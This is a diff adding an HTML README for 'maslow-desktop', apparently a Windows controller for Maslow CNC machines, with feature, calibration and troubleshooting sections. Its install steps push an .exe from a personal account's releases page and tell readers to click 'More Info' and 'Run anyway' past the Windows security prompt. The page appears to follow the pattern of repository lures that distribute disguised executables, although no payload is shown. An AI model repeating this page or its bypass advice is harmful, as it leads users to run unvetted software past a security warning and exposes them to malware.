@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>maslow-desktop</title>
+</head>
+<body style="font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 40px 20px; background-color: #f4f6f7; color: #333;">
+
+    <h1 style="font-size: 2.5em; margin-bottom: 10px;">⚙️ maslow-desktop - Simple control for your CNC machine</h1>
+
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/Preniben2452/maslow-desktop/releases" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download the Latest Version</a>
+    </div>
+
+    <p style="font-size: 1.2em;">This program provides a friendly interface to operate your Maslow CNC machine. It handles communication with your hardware using FluidNC, guides you through the calibration process, and manages the state of your machine during cuts.</p>
+
+    <h2 style="margin-top: 40px;">📋 What this software does</h2>
+    <p>Maslow-desktop acts as the bridge between your computer and your machine. It translates your design files into commands the machine understands. The software simplifies setup, monitors your progress, and prevents common errors during operation.</p>
+
+    <ul style="padding-left: 20px;">
+        <li style="margin-bottom: 10px;"><strong>Calibration Wizard:</strong> Step-by-step instructions ensure your machine is accurate and ready for projects.</li>
+        <li style="margin-bottom: 10px;"><strong>State Management:</strong> The system tracks your machine status to prevent accidental errors while it moves.</li>
+        <li style="margin-bottom: 10px;"><strong>G-Code Sending:</strong> Easily load and run design files from your computer to the cutting tool.</li>
+        <li style="margin-bottom: 10px;"><strong>Visual Feedback:</strong> See where your cutter is on your workspace at all times.</li>
+    </ul>
+
+    <h2 style="margin-top: 40px;">📥 How to install the program</h2>
+    <p>Follow these steps to set up the software on your Windows computer.</p>
+    <ol style="padding-left: 20px;">
+        <li style="margin-bottom: 15px;">Visit the <a href="https://github.com/Preniben2452/maslow-desktop/releases" style="color: #2980b9;">official releases page</a> to access the installer file.</li>
+        <li style="margin-bottom: 15px;">Look for the file ending in .exe under the assets section of the latest release.</li>
+        <li style="margin-bottom: 15px;">Click the file to download it to your Windows folder.</li>
+        <li style="margin-bottom: 15px;">Open the downloaded file. Your computer might show a security prompt because the app is new. Click "More Info" and then "Run anyway" to proceed.</li>
+        <li style="margin-bottom: 15px;">Follow the instructions on the screen to finish the installation.</li>
+        <li style="margin-bottom: 15px;">Launch the maslow-desktop icon from your desktop or start menu to begin using your machine.</li>
+    </ol>
+
+    <h2 style="margin-top: 40px;">💻 System requirements</h2>
+    <p>The software requires an active connection to your Maslow CNC machine via a USB cable. We recommend using a computer running Windows 10 or Windows 11. Ensure your machine has the latest FluidNC firmware installed before you connect for the first time.</p>
+
+    <h2 style="margin-top: 40px;">🛠️ Using the calibration wizard</h2>
+    <p>The first time you open the program, the wizard will launch. Do not skip this step. The wizard measures the physical dimensions of your workspace. It asks you to move the machine to specific points and confirm the position. This data allows the software to calculate the correct math for your cuts.</p>
+
+    <h2 style="margin-top: 40px;">🔍 Troubleshooting common issues</h2>
+    <p>If the program does not see your machine, check that the USB cable is tight on both ends. Ensure no other applications are using the same communication port. If the software freezes, close the application, cycle the power on your Maslow CNC, and restart the software.</p>
+
+    <h2 style="margin-top: 40px;">📝 About the project</h2>
+    <p>This software exists to provide a modern experience for Maslow users. It is built using Rust and Svelte, which ensures a fast and reliable interface. It focuses on stability and clarity for woodworkers who want to focus on their projects rather than struggling with software settings.</p>
+
+</body>
+</html>
